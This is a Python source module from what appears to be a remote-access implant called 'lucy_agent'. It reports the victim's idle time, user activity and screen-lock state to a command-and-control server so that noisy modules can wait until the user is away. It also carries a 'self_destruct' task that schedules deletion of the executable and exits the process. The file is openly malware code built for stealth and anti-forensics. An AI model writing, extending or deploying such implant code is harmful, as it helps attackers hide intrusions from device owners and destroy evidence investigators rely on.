"""
Agent module that exposes stealth / activity indicators to the C2 and
performs self-destruct when requested.

Tasks:
  - action="indicators"    : returns current idle time, user activity, screen lock.
  - action="status"        : returns current stealth controller configuration.
  - action="self_destruct" : schedules executable deletion and exits the process.
"""
import logging
import sys
import threading
from core.stealth import StealthController, get_idle_seconds

logger = logging.getLogger("lucy_agent")


def run(action: str = "indicators", **kwargs) -> dict:
    controller = StealthController()

    if action == "indicators":
        return {
            "status": "completed",
            "data": controller.get_indicators(),
        }

    if action == "status":
        return {
            "status": "completed",
            "data": {
                "enabled": controller.enabled,
                "idle_threshold": controller.idle_threshold,
                "active_delay": controller.active_delay,
                "noisy_modules": sorted(controller.noisy_modules),
                "raw_idle_seconds": get_idle_seconds(),
            },
        }

    if action == "check":
        return {
            "status": "completed",
            "data": {
                "user_active": controller.user_is_active,
                "idle_seconds": controller.get_indicators().get("idle_seconds"),
            },
        }

    if action == "self_destruct":
        delay = int(kwargs.get("delay", kwargs.get("params", {}).get("delay", 0)))

        def _destruct():
            if delay > 0:
                threading.Event().wait(timeout=delay)
            logger.warning("Self-destruct triggered via task. Shutting down.")
            try:
                from agent import _self_destruct
                _self_destruct()
            except Exception as exc:
                logger.error("Self-destruct helper failed: %s", exc)
            sys.exit(0)

        t = threading.Thread(target=_destruct, daemon=True)
        t.start()
        return {
            "status": "completed",
            "data": {"message": f"Self-destruct scheduled in {delay}s."},
        }

    return {"status": "failed", "error": f"Unknown action '{action}'"}
